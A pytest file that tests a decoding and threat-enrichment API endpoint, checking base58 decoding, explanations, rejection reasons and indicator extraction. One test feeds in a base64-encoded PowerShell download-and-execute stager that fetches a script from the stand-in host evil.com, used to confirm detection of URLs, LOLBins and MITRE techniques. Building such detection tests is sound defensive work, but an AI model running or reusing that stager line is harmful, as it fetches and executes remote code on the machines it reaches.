"""Tests for the /api/decode/candidates endpoint output format.

Uses `requests` against the live backend URL (matches the pattern of
`tests/test_new_features.py`) — avoids TestClient event-loop issues with
the async MongoDB driver.

Verifies the endpoint returns every field from the Feb-2026 spec:
    - candidates[], best, verdict
    - hex_representation, readability_score, signature
    - iocs, lolbins, mitre_techniques
    - explanation ("why this over alternatives")
"""
from __future__ import annotations
import base64
import os

import pytest
import requests


BASE_URL = os.environ.get("REACT_APP_BACKEND_URL", "").rstrip("/") or "http://localhost:8001"
if BASE_URL == "http://localhost:8001":
    try:
        with open("/app/frontend/.env") as f:
            for line in f:
                if line.startswith("REACT_APP_BACKEND_URL="):
                    BASE_URL = line.split("=", 1)[1].strip().rstrip("/")
    except Exception:
        pass

ADMIN_EMAIL = "admin@nivxray.com"
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")


@pytest.fixture(scope="module")
def auth_headers():
    r = requests.post(
        f"{BASE_URL}/api/auth/login",
        json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
        timeout=30,
    )
    assert r.status_code == 200, f"login failed: {r.text}"
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


class TestCandidatesEndpointBase58:
    """The exact acceptance case from the user prompt."""

    def test_base58_endpoint_full_response(self, auth_headers):
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": "2NEpo7TZRRrLZSi2U"},
            timeout=30,
        )
        assert r.status_code == 200, r.text
        data = r.json()

        v = data["verdict"]
        assert v["verdict"] == "decoded"
        assert v["op"] == "base58-decode"
        assert v["confidence"] >= 0.65

        # Hex representation matches the spec EXACTLY
        assert data["hex_representation"] == "48 65 6c 6c 6f 20 57 6f 72 6c 64 21"

        assert "readability_score" in data
        assert isinstance(data["readability_score"], (int, float))

        assert isinstance(data["iocs"], dict)
        assert isinstance(data["lolbins"], list)
        assert isinstance(data["mitre_techniques"], list)

        assert data["explanation"]
        assert "base58-decode" in data["explanation"]


class TestCandidatesEndpointMalwareEnrichment:
    """When decoded output contains malware indicators, all enrichment fires."""

    def test_powershell_stager_iocs_and_mitre(self, auth_headers):
        payload = (
            b"powershell.exe -nop -w hidden -c "
            b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')"
        )
        b64 = base64.b64encode(payload).decode()
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": b64},
            timeout=30,
        )
        assert r.status_code == 200
        data = r.json()

        assert data["verdict"]["verdict"] == "decoded"
        assert data["verdict"]["op"] == "base64-decode"

        assert "http://evil.com/x.ps1" in data["iocs"].get("urls", [])
        assert "evil.com" in data["iocs"].get("domains", [])

        mitre_ids = {t.get("id") for t in data["mitre_techniques"]}
        assert "T1059.001" in mitre_ids or "T1105" in mitre_ids

        lolbin_bins = [l.get("binary") for l in data["lolbins"]]
        assert "powershell.exe" in lolbin_bins


class TestCandidatesEndpointUnknownVerdict:
    """SHA-256 hash / UUID / random tokens should surface as unknown."""

    def test_sha256_hash_unknown_verdict(self, auth_headers):
        h = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": h},
            timeout=30,
        )
        assert r.status_code == 200
        data = r.json()

        # Best (if any) must have modest confidence, or verdict is unknown-or-identifier
        if data["best"] is None:
            assert data["verdict"]["verdict"] == "unknown-or-identifier"
            assert any("SHA-256" in hyp for hyp in data["verdict"]["hypotheses"])


class TestCandidatesEndpointExplanation:
    """Explanation must state WHY the winner was chosen over alternatives."""

    def test_explanation_compares_runners_up(self, auth_headers):
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": "2NEpo7TZRRrLZSi2U"},
            timeout=30,
        )
        assert r.status_code == 200
        expl = r.json()["explanation"]
        assert "base58-decode" in expl
        assert "confidence=" in expl
        assert "over " in expl or "only candidate" in expl



class TestStructuredWhyNot:
    """Every rejected candidate must carry structured `rejection_reasons`."""

    def test_rejection_reasons_shape(self, auth_headers):
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": "2NEpo7TZRRrLZSi2U", "top_n": 6},
            timeout=30,
        )
        assert r.status_code == 200
        data = r.json()
        winner_op = data["verdict"]["op"]

        found_rejection = False
        for c in data["candidates"]:
            if c["op"] == winner_op:
                continue
            found_rejection = True
            assert "rejection_reasons" in c
            for rr in c["rejection_reasons"]:
                assert set(rr.keys()) >= {"code", "severity", "description", "detail"}
                assert rr["severity"] in {"high", "medium", "low"}
            assert "vs_winner" in c
            assert c["vs_winner"]["winning_op"] == winner_op
        assert found_rejection

    def test_high_severity_when_decode_fails(self, auth_headers):
        r = requests.post(
            f"{BASE_URL}/api/decode/candidates",
            headers=auth_headers,
            json={"input": "2NEpo7TZRRrLZSi2U", "top_n": 8},
            timeout=30,
        )
        data = r.json()
        b64 = next((c for c in data["candidates"] if c["op"] == "base64-decode"), None)
        assert b64 is not None
        codes = [rr["code"] for rr in (b64.get("rejection_reasons") or [])]
        assert "decode-rejected" in codes
